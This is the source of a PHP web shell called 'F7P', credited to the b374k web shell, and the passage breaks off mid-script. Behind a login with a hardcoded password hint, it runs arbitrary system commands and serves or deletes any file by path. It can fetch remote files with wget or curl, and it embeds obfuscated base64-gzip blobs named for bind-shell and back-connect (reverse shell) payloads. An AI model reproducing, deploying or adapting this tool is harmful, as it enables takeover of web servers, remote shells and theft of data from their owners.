<?php
session_start();

if(isset($_POST['content_encoded']) && !empty($_POST['content_encoded'])) {
    $encoded = $_POST['content_encoded'];
    $decoded = base64_decode($encoded);
    if($decoded !== false) {
        $decompressed = gzinflate($decoded);
        if($decompressed !== false) {
            $_POST['content'] = $decompressed;
        }
    }
}

@error_reporting(0);
@set_time_limit(0);

// F7P - File 7ransfer Protocol
// core1: b374k, 2014 Aditya Kesuma
// core2: paxi@yahoo.com
// 70% icon by Michal Bačík

// User: admin | Pass: password123
// Use Bcrypt or https://lain.lain.ch/password-hash/
define('ADMIN_USER', 'admin');
define('ADMIN_PASS_HASH', '$2a$09$lF0dTQmb5Dhh2BG5DAS6NuzJ8/rOT9el9Nui2vZAZmWkkKKf4idCu');

$is_logged_in = false;
if (isset($_SESSION['f7p_logged_in']) && $_SESSION['f7p_logged_in'] === true) {
    $is_logged_in = true;
}

if (isset($_POST['login_submit'])) {
    $username = isset($_POST['login_user']) ? trim($_POST['login_user']) : '';
    $password = isset($_POST['login_pass']) ? $_POST['login_pass'] : '';
    
    if ($username === ADMIN_USER) {
        if (password_verify($password, ADMIN_PASS_HASH)) {
            $_SESSION['f7p_logged_in'] = true;
            $_SESSION['f7p_login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = 'Password salah!';
        }
    } else {
        $login_error = 'Username salah!';
    }
}

if (isset($_GET['logout']) && $_GET['logout'] == '1') {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!$is_logged_in) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>F7P - Login</title>
        <link rel="stylesheet" href="f7p-assets/_style.css">
    </head>
    <body class="login-page">
        <div class="login-container">
            <div class="brand">F<span>7</span>P</div>
            <div class="subtitle"><span class="lock">🔐</span> Secure Login</div>
            
            <?php if (isset($login_error)): ?>
                <div class="error"><?php echo $login_error; ?></div>
            <?php endif; ?>
            
            <form method="post" autocomplete="off">
                <div class="input-group">
                    <label>Username</label>
                    <input class="inputz" type="text" name="login_user" placeholder="Enter username" value="<?php echo isset($_POST['login_user']) ? htmlspecialchars($_POST['login_user']) : ''; ?>" autofocus required />
                </div>
                
                <div class="input-group">
                    <label>Password</label>
                    <input class="inputz" type="password" name="login_pass" placeholder="Enter password" required />
                </div>
                
                <input class="inputzbut" type="submit" name="login_submit" value="Login" />
            </form>
            
            <div class="hint">
                <span class="label">Use Bcrypt</span> <code>admin</code> / <code>password123</code>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit;
}

if(isset($_GET['dl']) && ($_GET['dl'] != "")){
	$file = $_GET['dl'];
	$filez = @file_get_contents($file);
   header("Content-type: application/octet-stream");
   header("Content-length: ".strlen($filez));
   header("Content-disposition: attachment; filename=\"".basename($file)."\";");
   echo $filez;
    exit;
}
elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")){
	$file = $_GET['dlgzip'];
	$filez = gzencode(@file_get_contents($file));
   header("Content-Type:application/x-gzip\n");
   header("Content-length: ".strlen($filez));
   header("Content-disposition: attachment; filename=\"".basename($file).".gz\";");
   echo $filez;
    exit;
}

$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")  $safemode = TRUE; else $safemode = FALSE;
$system = @php_uname();
if(strtolower(substr($system,0,3)) == "win") $win = TRUE;
else $win = FALSE;

if(isset($_GET['y'])){
	if(@is_dir($_GET['view'])){
		$pwd = $_GET['view'];
		@chdir($pwd);
	}
	else{
		$pwd = $_GET['y'];
		@chdir($pwd);
	}
}

if(!$win){
	if(!$user = rapih(exe("whoami"))) $user = "";
	if(!$id = rapih(exe("id"))) $id = "";
	$prompt = $user." \$ ";
	$pwd = @getcwd().DIRECTORY_SEPARATOR;
}
else {
	$user = @get_current_user();
	$id = $user;
	$prompt = $user." &gt;";
	$pwd = realpath(".")."\\";
 	$v = explode("\\",$d);
	$v = $v[0];
 	foreach (range("A","Z") as $letter)
 	{
	  $bool = @is_dir($letter.":\\");
	  if ($bool)
	  {
 		  $letters .= "<a href=\"?y=".$letter.":\\\">[ ";
		   if ($letter.":" != $v) {$letters .= $letter;}
		   else {$letters .= "<span class=\"gaya\">".$letter."</span>";}
		   $letters .= " ]</a> ";
  	  }
 }
}
if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;

$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$bindport = "13123";
$bindport_pass = "F7P";

$pwds = explode(DIRECTORY_SEPARATOR,$pwd);
$pwdurl = "";
$breadcrumb_full = "";
$total = sizeof($pwds)-1;
for($i = 0 ; $i < $total ; $i++){
	$pathz = "";
	for($j = 0 ; $j <= $i ; $j++){
		$pathz .= $pwds[$j].DIRECTORY_SEPARATOR;
	}
	if($i == $total-1){
		$breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\" style=\"font-size:18px;font-weight:bold;color:#0066cc;\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
	} else {
		$breadcrumb_full .= "<a href=\"?y=".$pathz."\" data-no-ajax=\"true\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>";
	}
}

if(isset($_POST['rename']) && isset($_POST['oldname']) && isset($_POST['newname'])){
	$old = trim($_POST['oldname']);
	$new = trim($_POST['newname']);
	$current_dir = isset($_POST['current_dir']) ? $_POST['current_dir'] : $pwd;
	
	if($old != $new && !empty($new)){
		$old_path = $current_dir . $old;
		$new_path = $current_dir . $new;
		
		if(!file_exists($new_path)){
			if(@rename($old_path, $new_path)){
				header("Location: ?y=".urlencode($current_dir));
				exit;
			}
		}
	}
	header("Location: ?y=".urlencode($current_dir));
	exit;
}

if(isset($_GET['delete']) && ($_GET['delete'] != "")){
	$file = $_GET['delete'];
	if(is_file($file)){
		@unlink($file);
	}
	header("Location: ?y=".urlencode($pwd));
	exit;
}

if(isset($_GET['fdelete']) && ($_GET['fdelete'] != "")){
    $dir = $_GET['fdelete'];
    if(is_dir($dir)){
       
        if(deleteFolder($dir)){
           
        } else {
           
        }
    }
    header("Location: ?y=".urlencode($pwd));
    exit;
}
if(isset($_GET['mkdir']) && ($_GET['mkdir'] != "")){
	$path = $pwd . $_GET['mkdir'];
	if(!file_exists($path)){
		@mkdir($path, 0755);
	}
	header("Location: ?y=".urlencode($pwd));
	exit;
}


function rapih($text){
	return trim(str_replace("<br />","",$text));
}

function deleteFolder($dir) {
    if (!is_dir($dir)) {
        return false;
    }
    
   
    $files = array_diff(scandir($dir), array('.', '..'));
    
    foreach ($files as $file) {
        $path = $dir . DIRECTORY_SEPARATOR . $file;
        
        if (is_dir($path)) {
           
            deleteFolder($path);
        } else {
           
            @unlink($path);
        }
    }
    return @rmdir($dir);
}

function magicboom($text){
	if (!get_magic_quotes_gpc()) {
   		 return $text;
	}
	return stripslashes($text);
}

function showdir($pwd,$prompt){
	global $user, $win, $posix;
	$fname = array();
	$dname = array();
	if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
	else $posix = FALSE;
	$user = "????:????";
	if($dh = @scandir($pwd)){
		foreach($dh as $file){
			if($file == '.' || $file == '..') continue;
			if(is_dir($file)){
				$dname[] = $file;
			}
			elseif(is_file($file)){
				$fname[] = $file;
			}
		}
	}
	else{
		if($dh = @opendir($pwd)){
			while($file = @readdir($dh)){
				if($file == '.' || $file == '..') continue;
				if(@is_dir($file)){
					$dname[] = $file;
				}
				elseif(@is_file($file)){
					$fname[] = $file;
				}
			}
			@closedir($dh);
		}
	}

	sort($fname);
	sort($dname);
	$path = @explode(DIRECTORY_SEPARATOR,$pwd);
	$tree = @sizeof($path);
	$parent = "";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $pwd;

	$buff = "<div class='table-wrap'><table class=\"explore\">";
	$buff .= "<thead><tr><th>name</th><th>size</th><th></th></tr></thead><tbody>";

$buff .= "<tr class=\"parent-row\" style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".$parent."'\">
    <td class=\"file-name\"><span class=\"folder-icon\"><img width=24px src=f7p-assets/up.png></span> ..</td>
    <td>go up one dir</td>
    <td style=\"text-align:right;\">
<a href=\"?y=$pwd&amp;x=upload\" data-no-ajax=\"true\"><img width=24px src=f7p-assets/upload.png></a>
        
        <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();createNewFolder('".addslashes($pwd)."');\" title=\"New Folder\"><img width=24px src=f7p-assets/new-dir.png></a>
<a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();createNewFile('".addslashes($pwd)."');\" title=\"New File\"><img width=24px src=f7p-assets/add-file.png></a> 

    </td>
</tr>";

	foreach($dname as $folder){
    $full_folder = $pwd.$folder;
    $safe_id = 'd_' . md5($folder);
    
    $buff .= "<tr style=\"cursor:pointer;\" onclick=\"window.location.href='?y=".urlencode($pwd.$folder.DIRECTORY_SEPARATOR)."'\">
        <td class=\"file-name\">
            <span class=\"folder-icon\">
                <img width=20px src=f7p-assets/dir.png>
            </span> 
            <span class=\"file-name-text\" id=\"{$safe_id}_link\">".htmlspecialchars($folder)."</span>  <!-- ← Tambahkan class -->
            <form action=\"?y=".urlencode($pwd)."\" method=\"post\" id=\"{$safe_id}_form\" class=\"rename-form\" style=\"display:none;\">
                <input type=\"hidden\" name=\"oldname\" value=\"".htmlspecialchars($folder)."\" />
                <input type=\"hidden\" name=\"current_dir\" value=\"".htmlspecialchars($pwd)."\" />
                <input type=\"hidden\" name=\"rename\" value=\"1\" />
                <input class=\"inputz rename-input\" type=\"text\" name=\"newname\" value=\"".htmlspecialchars($folder)."\" />
                <input class=\"inputzbut\" type=\"submit\" value=\"Rename\" onclick=\"event.stopPropagation();\" />
                <input class=\"inputzbut\" type=\"button\" value=\"✕\" onclick=\"event.stopPropagation();toggleRename('{$safe_id}');\" />
            </form>
        </td>
        <td></td>
        <td style=\"white-space:nowrap;text-align:right;\">
            <a href=\"javascript:void(0);\" onclick=\"event.stopPropagation();showRenameAlert('".addslashes($folder)."', '".addslashes($full_folder)."', '".addslashes($pwd)."', 'folder');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
            <a href=\"?y=".urlencode($pwd)."&amp;fdelete=".urlencode($pwd.$folder)."\" onclick=\"event.stopPropagation();return confirmDelete('".addslashes($folder)."', 'folder');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
        </td>
    </tr>";
}
foreach($fname as $file){
    $full = $pwd.$file;
    $size = ukuran($full);
    
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $image_exts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
    $is_image = in_array($ext, $image_exts);
    
    $edit_link = "edit=" . urlencode($full);
    $view_link = $is_image ? "img=" . urlencode($file) : "view=" . urlencode($full);
    
    $buff .= "<tr>
        <td class=\"file-name\">
            <span class=\"file-icon\">
                <img width=20px src=f7p-assets/file.png>
            </span> 
            <a href=\"?y=$pwd&amp;$edit_link\" data-no-ajax=\"true\">".htmlspecialchars($file)."</a>
            <form action=\"?y=".$pwd."\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"rename-form\" style=\"display:none;margin:0;padding:0;\">
                <input type=\"hidden\" name=\"oldname\" value=\"".htmlspecialchars($file)."\" />
                <input type=\"hidden\" name=\"current_dir\" value=\"".htmlspecialchars($pwd)."\" />
                <input class=\"inputz rename-input\" style=\"width:120px;\" type=\"text\" name=\"newname\" value=\"".htmlspecialchars($file)."\" />
                <input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"Rename\" onclick=\"event.stopPropagation();\" />
                <input class=\"inputzbut\" type=\"button\" value=\"✕\" onclick=\"event.stopPropagation();toggleRename('".clearspace($file)."');\" />
            </form>
        </td>
        <td>".$size."</td>
        <td style=\"white-space:nowrap;text-align:right;\">
            <a href=\"?y=$pwd&amp;$view_link\" data-no-ajax=\"true\" title=\"View\"><img width=20px src=f7p-assets/view.png></a>
            <a href=\"javascript:void(0);\" onclick=\"showRenameAlert('".addslashes($file)."', '".addslashes($full)."', '".addslashes($pwd)."');\" title=\"Rename\"><img width=20px src=f7p-assets/rename.png></a>
            <a href=\"?y=$pwd&amp;delete=$full\" onclick=\"return confirmDelete('".addslashes($file)."', 'file');\" data-no-ajax=\"true\" title=\"Delete\"><img width=20px src=f7p-assets/rcb.png></a>
            <a href=\"?y=$pwd&amp;dl=$full\" data-no-ajax=\"true\" title=\"Download\"><img width=20px src=f7p-assets/download.png></a>
        </td>
    </tr>";
}

	$buff .= "</tbody></table></div>";
	return $buff;
}

function ukuran($file){
	if($size = @filesize($file)){
		if($size < 1024) return $size." B";
		elseif($size < 1024*1024) {
			$size = @round($size / 1024,1);
			return "$size KB";
		}
		elseif($size < 1024*1024*1024) {
			$size = @round($size / 1024 / 1024,2);
			return "$size MB";
		}
		else {
			$size = @round($size / 1024 / 1024 / 1024,2);
			return "$size GB";
		}
	}
	else return "???";
}

function exe($cmd){
	if(function_exists('system')) {
		@ob_start();
		@system($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('exec')) {
		@exec($cmd,$results);
		$buff = "";
		foreach($results as $result){
			$buff .= $result;
		}
		return $buff;
	}
	elseif(function_exists('passthru')) {
		@ob_start();
		@passthru($cmd);
		$buff = @ob_get_contents();
		@ob_end_clean();
		return $buff;
	}
	elseif(function_exists('shell_exec')){
		$buff = @shell_exec($cmd);
		return $buff;
	}
}

function tulis($file,$text){
	$textz = gzinflate(base64_decode($text));
	 if($filez = @fopen($file,"w"))
	 {
		 @fputs($filez,$textz);
		 @fclose($file);
	 }
}

function ambil($link,$file) {
   if($fp = @fopen($link,"r")){
	   while(!feof($fp)) {
   		    $cont.= @fread($fp,1024);
   		}
   		@fclose($fp);
	   $fp2 = @fopen($file,"w");
	   @fwrite($fp2,$cont);
	   @fclose($fp2);
   }
}

function which($pr){
	$path = exe("which $pr");
	if(!empty($path)) { return trim($path); } else { return trim($pr); }
}

function download($cmd,$url){
	$namafile = basename($url);
	switch($cmd) {
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile);break;
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile);break;
		case 'wfread' : ambil($wurl,$namafile);break;
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break;
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break;
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break;
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break;
		default: break;
	}
	return $namafile;
}

function get_perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}

function clearspace($text){
	return str_replace(array(" ","/","\\",".","-","(",")","[","]"), "_", $text);
}

if(isset($_GET['img_direct']) && ($_GET['img_direct'] != "")){
    @ob_clean();
    $file = magicboom($_GET['img_direct']);
    if(is_file($file)){
        if(function_exists('finfo_open')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime = finfo_file($finfo, $file);
            finfo_close($finfo);
        } else {
            $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
            $mime_types = [
                'jpg' => 'image/jpeg', 'jpeg' => 'image/jpeg',
                'png' => 'image/png', 'gif' => 'image/gif',
                'bmp' => 'image/bmp', 'webp' => 'image/webp',
                'svg' => 'image/svg+xml', 'ico' => 'image/x-icon'
            ];
            $mime = isset($mime_types[$ext]) ? $mime_types[$ext] : 'application/octet-stream';
        }
        
        header("Content-Type: $mime");
        header("Cache-control: public");
        header("Expires: " . date("r", mktime(0,0,0,1,1,2030)));
        header("Cache-control: max-age=" . (60*60*24*7));
        header("Content-Length: " . filesize($file));
        @readfile($file);
    }
    exit;
}

$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf
+fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE
P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ
dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL
3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug
Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk
HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W
tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL
ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6
uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1
NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg
tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD
e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0
LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo
vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB
+hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect="fZFRS8IwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St
ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j
S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ
ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw
Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA
BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95
zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75
i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A
RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY
jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F
6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw==";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>F7P</title>
    <link rel="stylesheet" href="f7p-assets/_style.css">
    <script type="text/javascript">
        function initPushButton() {
            setTimeout(function() {
                updatePaths();
                var btn = document.getElementById('pushToGitBtn');
                var input = document.getElementById('github_full_path');
                if (btn && input) {
                    if (input.dataset.isValid === 'true' && input.value && input.value !== 'Loading...' && input.value !== '') {
                        btn.disabled = false;
                        btn.style.opacity = '1';
                        btn.style.cursor = 'pointer';
                        btn.style.background = '#2b3137';
                    } else {
                        btn.disabled = true;
                        btn.style.opacity = '0.5';
                        btn.style.cursor = 'not-allowed';
                    }
                }
            }, 500);
        }

        function updatePaths() {
            var token = localStorage.getItem('f7p_gh_token_9x7k2m');
            var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
            var serverPath = localStorage.getItem('f7p_gh_server_path_9x7k2m');
            var githubPath = localStorage.getItem('f7p_gh_path_9x7k2m');
            var fileInput = document.querySelector('input[name="saveas"]');
            var githubFullPath = document.getElementById('github_full_path');
            var btn = document.getElementById('pushToGitBtn');
            
            if (!githubFullPath) return;
            
            var fullPath = '';
            var isValid = false;
            
            if (!token || !repo || !serverPath || !githubPath) {
                fullPath = '⚠️ Setup GitHub API first (⋮ → GitHub API)';
                isValid = false;
            } else if (!fileInput || !fileInput.value) {
                fullPath = '❌ No file selected';
                isValid = false;
            } else {
                var filePath = fileInput.value;
                if (filePath.startsWith(serverPath)) {
                    var relativePath = filePath.substring(serverPath.length);
                    if (relativePath.startsWith('/') || relativePath.startsWith('\\')) {
                        relativePath = relativePath.substring(1);
                    }
                    var finalPath = githubPath;
                    if (!finalPath.endsWith('/')) finalPath += '/';
                    finalPath += relativePath;
                    fullPath = 'github.com/' + repo + '/' + finalPath;
                    isValid = true;
                } else {
                    fullPath = '🚫 File outside Server Path';
                    isValid = false;
                }
            }
            
            githubFullPath.value = fullPath;
            githubFullPath.style.color = isValid ? '#0066cc' : '#dc3545';
            githubFullPath.dataset.isValid = isValid ? 'true' : 'false';
            
            if (btn) {
                if (isValid && fullPath && fullPath !== '⚠️ Setup GitHub API first (⋮ → GitHub API)' && fullPath !== '❌ No file selected') {
                    btn.disabled = false;
                    btn.style.opacity = '1';
                    btn.style.cursor = 'pointer';
                    btn.style.background = '#2b3137';
                } else {
                    btn.disabled = true;
                    btn.style.opacity = '0.5';
                    btn.style.cursor = 'not-allowed';
                }
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var saveasInput = document.querySelector('input[name="saveas"]');
            if (saveasInput) {
                saveasInput.addEventListener('change', function() {
                    setTimeout(updatePaths, 100);
                });
                saveasInput.addEventListener('input', function() {
                    setTimeout(updatePaths, 100);
                });
            }
            
            window.addEventListener('storage', function(e) {
                if (e.key && e.key.startsWith('f7p_gh_')) {
                    setTimeout(updatePaths, 100);
                }
            });
            
            setTimeout(updatePaths, 200);
            setTimeout(initPushButton, 300);
        });

        document.addEventListener('DOMContentLoaded', function() {
            var breadcrumb = document.querySelector('#header .breadcrumb');
            if (breadcrumb) {
                setTimeout(function() {
                    breadcrumb.scrollLeft = breadcrumb.scrollWidth;
                }, 100);
            }
        });

        function toggleRename(id) {
            var link = document.getElementById(id + '_link');
            var form = document.getElementById(id + '_form');
            
            if (link && form) {
                if (form.style.display === 'none' || form.style.display === '') {
                    form.style.display = 'inline-block';
                    form.classList.add('show');
                    if (link) link.style.display = 'none';
                    var input = form.querySelector('input[name="newname"]');
                    if (input) {
                        setTimeout(function() { input.focus(); input.select(); }, 150);
                    }
                } else {
                    form.style.display = 'none';
                    form.classList.remove('show');
                    if (link) link.style.display = 'inline';
                }
            }
        }

        function confirmDelete(name, type) {
            return confirm('Move to the hell?\n\n' + name);
        }
function createNewFolder(currentDir) {
    var folderName = prompt('Enter new folder name:', '');
    if (folderName !== null && folderName.trim() !== '') {
        window.location.href = '?y=' + encodeURIComponent(currentDir) + '&mkdir=' + encodeURIComponent(folderName.trim());
    } else if (folderName === '') {
        alert('Folder name cannot be empty!');
    }
}

function createNewFile(currentDir) {
    var fileName = prompt('Enter new file name:', '');
    if (fileName !== null && fileName.trim() !== '') {
        window.location.href = '?y=' + encodeURIComponent(currentDir) + '&edit=' + encodeURIComponent(currentDir + fileName.trim());
    } else if (fileName === '') {
        alert('File name cannot be empty!');
    }
}
        function toggleDropdown() {
            var menu = document.getElementById('dropdown-menu');
            if (menu) {
                menu.classList.toggle('open');
            }
        }

        document.addEventListener('click', function(e) {
            var dropdown = document.querySelector('.dropdown');
            var menu = document.getElementById('dropdown-menu');
            if (dropdown && menu) {
                if (!dropdown.contains(e.target)) {
                    menu.classList.remove('open');
                }
            }
        });

        function toggleCommand() {
            var bar = document.getElementById('command-bar');
            if (bar) {
                bar.classList.toggle('show');
                if (bar.classList.contains('show')) {
                    var cmd = document.getElementById('cmd');
                    if (cmd) setTimeout(function() { cmd.focus(); }, 100);
                }
            }
        }

        function goToRoot() {
            window.location.href = '?y=/';
        }

        document.addEventListener('DOMContentLoaded', function() {
            document.addEventListener('click', function(e) {
                var link = e.target.closest('a');
                if (!link) return;
                if (link.target === '_blank') return;
                if (link.hasAttribute('data-no-ajax')) return;
                if (link.getAttribute('href') === '#') return;
                if (link.getAttribute('href').indexOf('javascript:') === 0) return;

                var url = link.getAttribute('href');
                if (!url || url.indexOf('?') === -1) return;

                e.preventDefault();

                if (window.history && window.history.pushState) {
                    window.history.pushState({ url: url }, '', url);
                }

                loadContent(url);
            });

            window.addEventListener('popstate', function(e) {
                if (e.state && e.state.url) {
                    loadContent(e.state.url);
                } else {
                    loadContent(window.location.href);
                }
            });
        });


function saveScrollPosition(url) {
    var content = document.getElementById('content');
    if (!content) return;
    
    var scrollData = {
        top: content.scrollTop,
        url: url || window.location.href
    };
    
    try {
        var key = 'f7p_scroll_' + encodeURIComponent(url || window.location.href);
        localStorage.setItem(key, JSON.stringify(scrollData));
        limitScrollData();
    } catch(e) {}
}

function limitScrollData() {
    try {
        var keys = Object.keys(localStorage);
        var scrollKeys = [];
        
        keys.forEach(function(key) {
            if (key.startsWith('f7p_scroll_')) {
                scrollKeys.push(key);
            }
        });
        
        if (scrollKeys.length > 2) {
            scrollKeys.sort();
            var toDelete = scrollKeys.slice(0, scrollKeys.length - 2);
            toDelete.forEach(function(item) {
                localStorage.removeItem(item);
            });
        }
    } catch(e) {}
}

function getScrollPosition(url) {
    try {
        var key = 'f7p_scroll_' + encodeURIComponent(url);
        var data = localStorage.getItem(key);
        if (data) {
            return JSON.parse(data);
        }
    } catch(e) {}
    return null;
}

var originalLoadContent = window.loadContent;

window.loadContent = function(url) {
    var content = document.getElementById('content');
    if (!content) return;
    
    var currentUrl = window.location.href;
    if (currentUrl) {
        saveScrollPosition(currentUrl);
    }
    
    fetch(url)
        .then(function(response) {
            return response.text();
        })
        .then(function(html) {
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, 'text/html');
            
            var newContent = doc.getElementById('content');
            if (newContent) {
                content.innerHTML = newContent.innerHTML;
            }
            
            var newBreadcrumb = doc.querySelector('#header .breadcrumb');
            if (newBreadcrumb) {
                var oldBreadcrumb = document.querySelector('#header .breadcrumb');
                if (oldBreadcrumb) {
                    oldBreadcrumb.innerHTML = newBreadcrumb.innerHTML;
                    setTimeout(function() {
                        oldBreadcrumb.scrollLeft = oldBreadcrumb.scrollWidth;
                    }, 50);
                }
            }
            
            var newFooter = doc.querySelector('#footer');
            if (newFooter) {
                var oldFooter = document.querySelector('#footer');
                if (oldFooter) {
                    oldFooter.innerHTML = newFooter.innerHTML;
                }
            }
            
            var scripts = content.querySelectorAll('script');
            scripts.forEach(function(script) {
                var newScript = document.createElement('script');
                if (script.src) {
                    newScript.src = script.src;
                } else {
                    newScript.textContent = script.textContent;
                }
                document.body.appendChild(newScript);
            });
            
            var savedPosition = getScrollPosition(url);
            if (savedPosition && savedPosition.top > 0) {
                setTimeout(function() {
                    content.scrollTop = savedPosition.top;
                }, 150);
            }
        })
        .catch(function(err) {});
};

window.addEventListener('popstate', function(e) {
    var url = window.location.href;
    var content = document.getElementById('content');
    if (content) {
        saveScrollPosition(window.location.href);
    }
    setTimeout(function() {
        var savedPosition = getScrollPosition(url);
        if (savedPosition && savedPosition.top > 0) {
            content.scrollTop = savedPosition.top;
        }
    }, 200);
});

window.addEventListener('beforeunload', function() {
    var content = document.getElementById('content');
    if (content) {
        saveScrollPosition(window.location.href);
    }
});

document.addEventListener('DOMContentLoaded', function() {
    setTimeout(function() {
        var content = document.getElementById('content');
        if (content) {
            var saved = getScrollPosition(window.location.href);
            if (saved && saved.top > 0) {
                content.scrollTop = saved.top;
            }
        }
    }, 200);
});

document.addEventListener('click', function(e) {
    var link = e.target.closest('a[href]');
    if (!link) return;
    
    var href = link.getAttribute('href');
    if (!href || href === '#' || href.indexOf('javascript:') === 0) return;
    if (link.hasAttribute('data-no-ajax')) return;
    if (link.target === '_blank') return;
    
    var content = document.getElementById('content');
    if (content) {
